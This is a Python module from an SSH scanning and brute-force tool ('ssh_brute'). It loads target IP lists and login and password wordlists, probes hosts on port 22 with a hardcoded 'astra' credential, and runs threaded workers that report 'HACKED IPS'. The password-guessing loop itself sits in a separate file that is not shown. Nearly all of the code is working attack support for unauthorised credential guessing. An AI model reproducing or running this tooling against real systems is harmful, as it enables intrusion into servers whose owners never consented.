from termcolor import colored
import threading
import paramiko
import argparse
import os

def get_parser(env) -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog='ssh_brute', 
        description='SSH scanning and bruteforce tool', 
        epilog='made by vladislav_fl'
        )

    parser.add_argument(
        "-v", 
        "--version", 
        action="version",
        version=f"{env['VERSION']}",
        help="show the version of this program and exit"
    )
    parser.add_argument(
        "-i", 
        "--ip_file",
        action="store",
        required=True,
        help='name of the file with ip addresses or domain names'
    )
    parser.add_argument(
        "-l", 
        "--logins_file",
        action="store",
        required=True,
        help='name of the file with ip addresses or domain names'
    )
    parser.add_argument(
        "-p", 
        "--passwords_file",
        action="store",
        required=True,
        help='name of the file with ip addresses or domain names'
    )
    # scan, brute, all
    parser.add_argument(
        "-m", 
        "--mode",
        action="store",
        default='all',
        required=True,
        help='script phase (scan, brute, all)'
    )
    
    return parser

def check_for_good_ips(ips) -> list:
    good_ips = []
    for ip in ips:
        if type(ip) == list:
            for one_ip in ip:
                print(f'[INFO] TRYING {one_ip}')
                if ping_port(one_ip):
                    good_ips.append(one_ip)
                    print(colored(f'[INFO] FOUND!', 'green'))
                else:
                    print(colored('[INFO] NO ANSWER...', 'red'))
        else:
            print(f'[INFO] TRYING {ip}')
            if ping_port(ip):
                good_ips.append(ip)
                print(colored(f'[INFO] FOUND!', 'green'))
            else:
                print(colored('[INFO] NO ANSWER...', 'red'))
    return good_ips

def get_ips(env, arguments) -> list:
    ips = []
    with open(f'{env["INPUT_FOLDER"]}{arguments.ip_file}', 'r') as ips_file:
        ips = ips_file.read().split('\n')
    
    for i in range(len(ips)):
        if '_' in ips[i]:
            ips[i] = ips[i].split('_')
            
    return ips

def get_good_ips(env) -> list:
    pre_ips = []
    with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_GOOD_IPS"]}', 'r') as ips_file:
        pre_ips = ips_file.read().split('\n')
    
    ips = []
    for i in range(len(pre_ips)):
        if pre_ips[i] != '':
            ips.append(pre_ips[i])
    
    return ips

def ping_port(ip) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=ip,
            port=22,
            username='astra',
            password='astra',
            timeout=5
        )
    except paramiko.ssh_exception.NoValidConnectionsError:
        return False
    except paramiko.ssh_exception.AuthenticationException or paramiko.ssh_exception.BadAuthenticationType or paramiko.ssh_exception.PasswordRequiredException:
        return True
    except Exception:
        return False
    else:       
        client.close()
        return True

def prepare(ENV, arguments):
    threads = Threads(ENV['THREADS'])

    LOGINS: list = []
    PASSWORDS: list = []
    with open(f'{ENV["INPUT_FOLDER"]}{arguments.logins_file}', 'r') as logins_file:
        for line in logins_file:
            LOGINS.append(line.replace('\n', ''))

    with open(f'{ENV["INPUT_FOLDER"]}{arguments.passwords_file}', 'r') as passwords_file:
        for line in passwords_file:
            PASSWORDS.append(line.replace('\n', ''))

    print(colored('[INFO] CREDENTIONALS ARE LOADED', 'green'))

    current_work_ips: list = ['' for i in range(ENV['THREADS'])]
    current_creds: list = ['' for i in range(ENV['THREADS'])]
    worked_ips: list = []
    good_ips: list = []
    
    os.system(f'rm -f {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_FOUND_IPS"]}; touch {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_FOUND_IPS"]}')
    os.system(f'rm -f {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_FOUND_IPS_EXTENDED"]}; touch {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_FOUND_IPS_EXTENDED"]}')
    os.system(f'rm -f {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_ERRORS"]}; touch {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_ERRORS"]}')
    
    return LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips

def show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips):
    os.system('clear')
    print('[SCAN] SCRIPT UNDER WORKING...')
    print("CURRENT IPS UNDER TESTING:")
    for j in range(len(current_work_ips)):
        try:
            print(current_work_ips[j], '-->', f'{current_creds[j][0]}:{current_creds[j][1]}')
        except IndexError:
            break # test this point as when ips list is small there will be always IndexErrors while ips are testing
    print(f'\n-----\n\nCHECKED IPS: {worked_ips}')
    print(f'\n-----\n\nHACKED IPS: {good_ips}')

class Threads:
    def __init__(self, count) -> None:
        self.threads: list = []
        self.jobs: list = []
        self.count = count

    def run(self):
        # 1 argument MAX
        for i in range(self.count):
            self.threads.append(
                threading.Thread(target=self.jobs[i][0], args=(self.jobs[i][1], self.jobs[i][2], self.jobs[i][3]))
            )
        for thread in self.threads:
            thread.start()
        for thread in self.threads:
            thread.join()


if __name__ == '__main__':
    print(colored('[WARNING] PLEASE LAUNCH ssh_brute.py', 'red'))
